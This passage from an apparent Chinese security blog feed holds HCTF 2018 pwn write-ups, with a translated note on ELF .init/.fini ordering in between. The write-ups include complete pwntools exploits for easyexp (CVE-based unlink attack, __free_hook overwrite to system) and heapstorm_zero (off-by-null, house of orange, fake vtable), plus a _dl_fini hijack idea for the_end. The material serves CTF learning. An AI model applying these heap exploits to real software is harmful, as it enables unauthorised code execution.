class="string">&quot;mkdir:create failed.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>

<p>当程序调用<code>mkdir()</code>函数后，会将用户输入的路径传入<code>canonicalize_file_name()</code>进行验证是否创建成功，此处即为触发漏洞的位置。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>当“缓存”满后，将会重用最后使用的“缓存”的下一个“缓存”。首先将三个“缓存”都填满，第二个缓存内容均为’/‘，利用CVE漏洞改写第三个“缓存”指向的内容的chunk的<code>size</code>域，将<code>size</code>改小（防止和top chunk合并）并布置合适的fake chunk。</p>
<p>随后进行<code>unlink</code>攻击，通过改写“缓存”结构体中的内容指针来泄漏地址和修改<code>__free_hook</code>。</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkfile</span>(<span class="params">p, filename, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkfile &#x27;</span> + filename)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;write something:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkdir</span>(<span class="params">p, path</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkdir &#x27;</span> + path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./easyexp&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your home\&#x27;s name: &#x27;</span>, <span class="string">&#x27;(unreachable)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">&#x27;hack&#x27;</span>, <span class="string">&#x27;hack by sunichi&#x27;</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, <span class="string">&#x27;/&#x27;</span> * <span class="number">0x107</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x90</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    Mkdir(p, <span class="string">&#x27;../../s\x90&#x27;</span>)</span><br><span class="line">    Mkdir(p, <span class="string">&#x27;../../\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x31</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;aa&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x10</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x6031e0</span>) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;cat bb&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\x0a\x1b&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(next(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkfile getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>cve</tag>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>.init and .fini</title>
    <url>/2019/09/29/elf-init-fini-note/</url>
    <content><![CDATA[<p>基于<code>Oracle</code>关于<code>Solaris</code>的文档对程序初始化和终止部分进行学习。</p>
<a id="more"></a>

<h3 id="初始化和终止步骤"><a href="#初始化和终止步骤" class="headerlink" title="初始化和终止步骤"></a>初始化和终止步骤</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在运行时链接器（runtime linker）将控制权交给一个应用之前，它会对程序和其它已经加载的依赖的初始化段进行处理。初始化段包括 <code>.preinit_array</code>、 <code>.init_array</code>和 <code>.init</code>，它们在构建动态对象（dynamic object）时由链接编辑器（link-editor）创建。</p>
<p>运行时链接器将会执行地址保存在<code>.preinit_array</code> 和 <code>.init_array</code>段中的函数。这些函数会按照在数组中的顺序依次被执行。运行时链接器将<code>.init</code>段作为一个单独的函数来执行。如果一个动态对象同时拥有<code>.init_array</code>和 <code>.init</code>段，<code>.init</code>段会被优先处理。</p>
<p>动态对象可能会在<code>.preinit_array</code>段中提供预初始化函数。这些函数会在动态连接器完成进程映像（process image）建立和重定位后、其它任何初始化函数执行之前进行调用。共享对象中不允许使用预初始化函数。</p>
<p>任何在动态可执行文件中的<code>.init</code>都是由编译器驱动程序（compiler driver）提供的进程启动机制从应用程序本身调用的。在执行所有依赖的初始化部分后，动态可执行文件中的<code>.init</code>段将被调用。</p>
<h4 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h4><p>动态对象同样可以提供终止段，包括 <code>.fini_array</code> 和 <code>.fini</code> ，它们由链接编辑器在构建动态对象时创建。任何终止段会被例如<code>atexit</code>记录。当进程调用<code>exit</code>或者<code>dlclose</code>从正在运行的进程中删除对象时，将会调用这些例程（routine）。</p>
<p>运行时链接器执行这些地址包含在 <code>.fini_array</code> 中的函数，这些函数的执行顺序与它们出现在数组中的顺序相反。运行时链接器将<code>.fini</code>作为单个函数执行。如果同时包含 <code>.fini</code> 和 <code>.fini_array</code> ，则优先处理<code>.fini_array</code>。</p>
<p>任何在动态可执行文件中的<code>.fini</code>都是由编译器驱动程序（compiler driver）提供的进程终止机制从应用程序本身调用的。在执行所有依赖的终止部分后，动态可执行文件中的<code>.fini</code>段将被调用。</p>
<h3 id="初始化和终止顺序"><a href="#初始化和终止顺序" class="headerlink" title="初始化和终止顺序"></a>初始化和终止顺序</h3><p>确定运行时在进程内执行初始化和终止代码的顺序是涉及依赖性分析的复杂问题。这个技术发展至今，试图满足现代编程语言和编程技术的期望，但仍存在一些令用户难以满足的情况。理解和限制初始化和终止代码的内容可以提供灵活和可预测的程序运行时行为。</p>
<p>在Solaris 2.6发行版之前，依赖初始化过程以反向加载顺序调用，这与使用ldd显示的依赖项顺序相反。类似的，依赖终止顺序以加载顺序相同。但是，随着依赖层次结构变得更为复杂，这种简单的排序方法变得不合时宜。</p>
<p>从Solaris 2.6开始，运行时链接器构造已加载对象的拓扑列表，这个列表根据每个对象的依赖关系以及依赖关系之外的任何符号绑定所构建。初始化部分以依赖性的反向拓扑顺序执行，如果找到循环依赖关系，则不能对形成循环的对象进行拓扑排序。任何循环依赖的初始化部分以其反向加载顺序执行。类似的，终止过程以依赖关系的拓扑顺序执行，循环依赖关系以其加载顺序执行。</p>
<p>使用ldd与- i选项可以显示对象依赖项的初始化顺序。例如以下动态可执行文件及其依赖表现出循环依赖关系：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dump -Lv B.so.1 | grep NEEDED</span><br><span class="line">[1]     NEEDED      C.so.1</span><br><span class="line">$ dump -Lv C.so.1 | grep NEEDED</span><br><span class="line">[1]     NEEDED      B.so.1</span><br><span class="line">$ dump -Lv main | grep NEEDED</span><br><span class="line">[1]     NEEDED      A.so.1</span><br><span class="line">[2]     NEEDED      B.so.1</span><br><span class="line">[3]     NEEDED      libc.so.1</span><br><span class="line">$ ldd -i main</span><br><span class="line">        A.so.1 =&gt;        ./A.so.1</span><br><span class="line">        B.so.1 =&gt;        ./B.so.1</span><br><span class="line">        libc.so.1 =&gt;     /usr/lib/libc.so.1</span><br><span class="line">        C.so.1 =&gt;        ./C.so.1</span><br><span class="line">        libdl.so.1 =&gt;    /usr/lib/libdl.so.1</span><br><span class="line"></span><br><span class="line">   cyclic dependencies detected, group[1]:</span><br><span class="line">        ./libC.so.1</span><br><span class="line">        ./libB.so.1</span><br><span class="line"></span><br><span class="line">   init object=/usr/lib/libc.so.1</span><br><span class="line">   init object=./A.so.1</span><br><span class="line">   init object=./C.so.1 - cyclic group [1], referenced by:</span><br><span class="line">        ./B.so.1</span><br><span class="line">   init object=./B.so.1 - cyclic group [1], referenced by:</span><br><span class="line">        ./C.so.1</span><br></pre></td></tr></table></figure>

<p>对于使用<code>dlopen</code>添加到正在运行的进程的任何对象，将重复初始化处理。对于调用<code>dlclose</code>，会对从进程卸载的任何对象执行终止处理。</p>
<p>符号绑定作为依赖分析的一部分进行，因为存在许多不能准确表达其依赖关系的共享对象，因此，合并符号绑定有助于产生更准确的依赖关系。但是向不表达所有依赖关系的对象添加符号绑定信息仍可能不足以确定对象的完全依赖关系。最常见的加载对象模型使用延迟绑定。使用此模型，在初始化处理之前仅处理直接引用符号绑定，来自延迟引用的符号绑定可能处于未决状态，并且可能扩展到目前为止建立的依赖关系。</p>
<p>由于对象的依赖性分析可能不完整，并且经常存在循环依赖，因此运行时链接器还提供动态初始化。此初始化尝试在调用同一对象中的任何函数之前执行初始化部分。在延迟符号绑定期间，运行时链接器确定是否已调用绑定的对象的初始化部分，如果不是则在符号绑定过程返回之前调用它们。</p>
<p>使用ldd无法显示动态初始化，但是，通过设置<code>LD_DEBUG</code>可以在运行时观察到确切的初始化调用序列。动态初始化尽在处理延迟引用时可用，使用<code>LD_BIND_NOW</code>、<code>-z now</code>构建对象或<code>dlopen</code>使用模式<code>RTLD_NOW</code>引用的对象可以绕过任何动态初始化。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat main.c</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>    <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">&quot;initializing: foo()\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">&quot;finalizing: bar()\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main() &#123;</span><br><span class="line">        (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">&quot;main()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cc -o main -zinitarray=foo -zfiniarray=bar main.c</span><br><span class="line">$ main</span><br><span class="line">initializing: foo()</span><br><span class="line">main()</span><br><span class="line">finalizing: bar()</span><br></pre></td></tr></table></figure>



<blockquote>
<p>原文：<a href="https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html">https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html</a></p>
<p>示例：<a href="https://docs.oracle.com/cd/E19253-01/819-7050/chapter2-48195/index.html">https://docs.oracle.com/cd/E19253-01/819-7050/chapter2-48195/index.html</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hctf 2018 heapstorm_zero</title>
    <url>/2018/11/21/hctf18-heapstorm/</url>
    <content><![CDATA[<p>本题的关键主要在于通过<code>scanf()</code>调用<code>malloc()</code>申请一个<code>large bin</code>从而触发<code>fastbin</code>的合并获取<code>unsorted bin</code>。当获得了<code>unsorted bin</code>后，就是常规的<code>off by null</code>和<code>house of orange</code>题了。</p>
<a id="more"></a>

<p>本题另一麻烦的地方就是在做<code>house of orange</code>时修改<code>unsorted bin</code>的<code>size</code>，需要利用chunk的重叠来实现（在<code>off by null</code>和<code>unlink</code>时，会产生能够利用的指针）。感觉还是tcl，exp写了140行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./heapstorm_zero&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x19</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">7</span>:</span><br><span class="line">            Allocate(p, <span class="number">0x33</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x30</span> + <span class="string">&#x27;\x00\x01\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">15</span>:</span><br><span class="line">            Allocate(p, <span class="number">0x10</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Allocate(p, <span class="number">0x30</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Allocate(p, <span class="number">0x10</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x30</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">9</span>):</span><br><span class="line">        Delete(p, i) <span class="comment"># 4 5 6 7 8</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">3</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    Allocate(p, <span class="number">0x38</span>, payload) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">4</span>)</span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x30</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Show(p, <span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - (<span class="number">0x7ffff7dd1b78</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x15</span>, <span class="number">0x15</span>+<span class="number">6</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Show(p, <span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    heap_chunk_base = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x540</span></span><br><span class="line">    Allocate(p, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">27</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>, <span class="number">21</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    Delete(p, <span class="number">8</span>)</span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line">    Delete(p, <span class="number">10</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>) <span class="comment"># clear the chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Attack</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x10</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    Delete(p, <span class="number">8</span>)</span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line">    Delete(p, <span class="number">10</span>) <span class="comment"># 10 -&gt; fake file structure</span></span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;sunichi!\x31\n&#x27;</span>) <span class="comment"># 10</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x500</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invaild choice!\n&#x27;</span>) <span class="comment"># get unsorted bin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># make 0x60 unsorted bin</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;sunichi\n&#x27;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">5</span>)</span><br><span class="line">    payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(libc.address + (<span class="number">0x7ffff7dd1b20</span> - <span class="number">0x7ffff7a0d000</span>)) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x37</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">11</span>)</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x37</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">12</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(heap_chunk_base + (<span class="number">0x555555757230</span> - <span class="number">0x555555756fe0</span>))</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, payload + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># vtable</span></span><br><span class="line">    Delete(p, <span class="number">13</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    Allocate(p, <span class="number">0x37</span>, payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, str(<span class="number">0x17</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title>hctf 2018 pwn writeup</title>
    <url>/2018/11/12/hctf2018/</url>
    <content><![CDATA[<h2 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h2><p>程序自身的功能很简单：</p>
<ul>
<li>提供libc地址（2.23）</li>
<li>关闭<code>stdout</code>和<code>stderr</code></li>
<li>5次对所给地址修改1字节的机会</li>
</ul>
<a id="more"></a>

<p>在进行5次修改后，程序调用了<code>exit()</code>函数。一开始的思路是对libc中的FILE结构体进行修改，从而将程序劫持到one_gadget处，但是比赛时想到的方法大概需要10字节左右的修改，放弃。</p>
<p>接着就开始对<code>exit()</code>函数进行研究，在gdb里对<code>exit()</code>函数一步一步地进行跟踪，发现两个能利用的点：</p>
<ul>
<li><a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/blob/master/0x00ctf-2017/pwn/left-250/README.md">0x00 CTF 2017 left</a> 的解题思路，但是无法获得随机数，放弃。</li>
<li>在<code>_dl_fini</code>函数中，会执行<code>call   QWORD PTR [rip+0x216414] #&lt;_rtld_global+3848&gt;</code>，该位置位于<code>ld.so</code>当中，是能够修改的位置。</li>
</ul>
<p>因此在第二个点的基础上继续研究。通过<code>vmmap</code>可以得知<code>ld.so</code>的这个位置到<code>libc.so.6</code>的基地址的偏移是固定的，虽然他们中间的空间不是连续的（后续再具体研究一下为什么Orz，这题中没问题就对啦）。将该位置的数据修改为<code>one_gadget</code>即可。</p>
<p>另一个需要解决的问题是程序关闭了<code>stdout</code>，所以拿到shell后无法看到服务器的返回。通过<code>exec /bin/sh 1&gt;&amp;0</code>即可对输出流进行重定向，能正常与shell交互。</p>
